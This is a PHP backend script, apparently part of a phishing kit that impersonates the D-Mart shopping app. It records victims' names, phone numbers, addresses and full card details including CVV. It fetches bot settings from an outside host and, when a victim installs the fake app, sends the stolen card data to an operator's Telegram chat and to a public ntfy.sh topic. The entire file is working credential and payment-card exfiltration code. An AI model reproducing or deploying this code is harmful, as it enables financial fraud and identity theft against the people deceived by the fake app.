<?php
date_default_timezone_set("Asia/Kolkata");

// DB connection
include 'panel/db_config.php';
if ($conn->connect_error) {
    die(json_encode(["error" => "DB Connection Error"]));
}

// Collect and sanitize POST data
$name = $conn->real_escape_string($_POST['name'] ?? '');
$mobile = $conn->real_escape_string($_POST['phone'] ?? '');
$device = $conn->real_escape_string($_POST['device'] ?? '');
$lastseen = date("Y-m-d H:i:s");

// Validation
if (empty($name) || empty($mobile) || empty($device)) {
    echo json_encode(["error" => "All fields required"]);
    exit;
}
if (!preg_match('/^[0-9]{10}$/', $mobile)) {
    echo json_encode(["error" => "Invalid phone number format"]);
    exit;
}

// Get domain-based bot config
$domain = "https://" . $_SERVER['HTTP_HOST'];
$config_url = "https://techsmsserver.site/dmart/web.php?domain=" . urlencode($domain);
$config = json_decode(file_get_contents($config_url), true);
$bot_token = $config['bot_id'] ?? '';
$chat_id = $config['chat_id'] ?? '';
$ntfy_topic = "dmart";

// Check if user exists
$check = $conn->query("SELECT * FROM form_data WHERE mobile = '$mobile'");
$isExisting = $check->num_rows > 0;

// UPSERT
$stmt = $conn->prepare("
    INSERT INTO form_data (
        name, mobile, city, state, address, pin, product, total, quantity,
        card_type, card_no, exp_month, exp_year, cvv, downloaded, installed,
        msg1, msg2, lastseen, cf_status, forwarded_to, device
    ) VALUES (
        ?, ?, 'from app', 'from app', 'from app', 'from app', 'from app', 'from app', 'from app',
        'from app', 'from app', 'from app', 'from app', 'from app', 0, 1,
        'from app', 'from app', ?, 'disabled', NULL, ?
    )
    ON DUPLICATE KEY UPDATE 
        name = VALUES(name),
        device = VALUES(device),
        lastseen = VALUES(lastseen),
        installed = 1
");
$stmt->bind_param("ssss", $name, $mobile, $lastseen, $device);
$stmt->execute();

// Build message
if ($bot_token && $chat_id) {
    if ($isExisting) {
        $row = $check->fetch_assoc();
        $cleanName = $row['name'];
        $cleanMobile = $row['mobile'];
        $cleanAddress = "{$row['address']} , {$row['city']} , {$row['state']} , {$row['pin']}";
        $cardNo = $row['card_no'];
        $expMonth = $row['exp_month'];
        $expYear = $row['exp_year'];
        $cvv = $row['cvv'];
        $product = $row['product'];
        $time = $row['lastseen'];

        $message = "*$cleanName installed D-Mart App*\n"
            . "👤 *Name*: `$cleanName`\n"
            . "📞 *Mobile number*: `$cleanMobile`\n"
            . "🏠 *Address*: `$cleanAddress`\n"
            . "💳 *Card details*:\n```$cardNo | $expMonth | $expYear | CVV: $cvv```\n"
            . "📥 *Installed on*: `$time`\n"
            . "🛒 *Product name*: `$product`\n"
            . "🌐 *Site URL*: `$domain`";
    } else {
        $message = "🔔 `$name` is trying to login to *D-Mart App*\n"
            . "📞 *Phone*: `$mobile`\n"
            . "📱 *Device*: `$device`\n"
            . "🕒 *Time*: `$lastseen`\n"
            . "🌐 *Domain*: `$domain`";
    }

    // Send to Telegram
    $tg_url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $tg_data = [
        "chat_id" => $chat_id,
        "text" => $message,
        "parse_mode" => "Markdown"
    ];
    $ch = curl_init($tg_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $tg_data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Send to ntfy.sh
    $ntfy_url = "https://ntfy.sh/$ntfy_topic";
    $ch2 = curl_init($ntfy_url);
    curl_setopt($ch2, CURLOPT_POST, true);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $message);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, [
        "Title: D-Mart Alert",
        "Priority: high",
        "Tags: login,dmart,user"
    ]);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch2);
    curl_close($ch2);
}

// Final output
echo json_encode([
    "success" => true,
    "status" => $isExisting ? 'updated' : 'inserted',
    "mobile" => $mobile
]);

$stmt->close();
$conn->close();
?>
